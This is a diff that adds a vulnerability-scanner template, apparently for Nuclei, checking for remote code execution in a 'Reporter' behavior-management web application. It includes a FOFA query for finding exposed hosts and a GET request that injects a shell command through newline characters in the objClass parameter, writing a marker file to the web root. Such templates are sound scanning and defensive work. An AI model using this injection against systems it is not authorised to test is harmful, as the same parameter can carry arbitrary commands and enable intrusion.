@@ -1,0 +1,26 @@
+id: reporter-rce
+
+info:
+  name: Reporter RCE
+  author: zp857
+  severity: critical
+  tags: reporter,rce,behaviormanagement
+  metadata:
+    fofa-query: 'icon_hash="-1595726841" || title="Login @ Reporter"'
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/view/Behavior/toQuery.php?method=getList&objClass=%0aecho%20%27zp857%27%3E/var/www/reporter/zp857.txt%0a"
+
+      - "{{BaseURL}}/zp857.txt"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "zp857"
+
+      - type: status
+        status:
+          - 200
